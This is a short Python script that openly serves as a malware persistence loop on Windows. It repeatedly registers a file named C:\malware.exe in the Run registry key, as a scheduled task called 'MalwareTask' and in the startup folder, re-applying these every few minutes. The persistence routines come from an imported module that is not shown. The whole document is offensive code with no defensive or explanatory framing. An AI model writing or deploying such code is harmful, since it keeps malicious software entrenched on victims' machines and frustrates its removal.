import os
import time
import random
from persistence_methods import Persistence

class AutoRun:
    def __init__(self, malware_path):
        self.malware_path = malware_path
        if not os.path.isfile(self.malware_path):
            raise FileNotFoundError(f"Malware path {self.malware_path} does not exist!")

    def run(self):
        while True:
            try:
                Persistence.registry("Software\\Microsoft\\Windows\\CurrentVersion\\Run", self.malware_path)
                Persistence.scheduled_task("MalwareTask", self.malware_path)
                Persistence.startup_folder(self.malware_path)
                time.sleep(random.uniform(300, 600))
            except KeyboardInterrupt:
                print("AutoRun stopped by user")
                break
            except Exception as e:
                print(f"Erreur d'exécution : {e}")
                time.sleep(120)

autorun = AutoRun(r"C:\malware.exe")
autorun.run()
